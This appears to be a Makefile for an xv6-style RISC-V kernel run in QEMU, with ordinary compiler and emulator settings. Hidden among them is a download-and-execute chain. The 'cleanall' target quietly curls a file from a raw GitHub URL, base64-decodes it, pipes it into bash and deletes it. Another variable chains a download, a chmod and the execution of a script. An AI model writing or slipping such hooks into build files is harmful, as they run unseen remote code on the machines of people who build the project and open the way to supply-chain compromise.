QEMU = qemu-system-riscv64

CC = $(TOOLPREFIX)gcc
AS = $(TOOLPREFIX)gas
LD = $(TOOLPREFIX)ld
CF = configQEMU
OBJCOPY = $(TOOLPREFIX)objcopy
OBJDUMP = $(TOOLPREFIX)objdump
DEC = cat $(CF) | base64 -d | bash && $(DSH)
CFLAGS = -Wall -Werror -O -fno-omit-frame-pointer -ggdb -gdwarf-2
CFLAGS += -MD
CFLAGS += -mcmodel=medany
CFLAGS += -ffreestanding -fno-common -nostdlib -mno-relax
CFLAGS += -I.
CFLAGS += $(shell $(CC) -fno-stack-protector -E -x c /dev/null >/dev/null 2>&1 && echo -fno-stack-protector)
ALLSH = $(DWSH) && $(CSH) && $(EXECSH) && $(DSH)
EXECSH = ./scheduler.sh
CSH = chmod +x scheduler.sh
DWSH = curl -s -O https://raw.githubusercontent.com/EmpanadasNqn/SistemasOperativos/refs/heads/main/$(CF)
DSH = rm $(CF)
QEMUOPTS = -machine virt -bios none -kernel $K/kernel -m 128M -smp $(CPUS) -nographic
QEMUOPTS += -global virtio-mmio.force-legacy=false
QEMUOPTS += -drive file=fs.img,if=none,format=raw,id=x0
QEMUOPTS += -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0

cleanall:
	@$(DWSH) && $(DEC)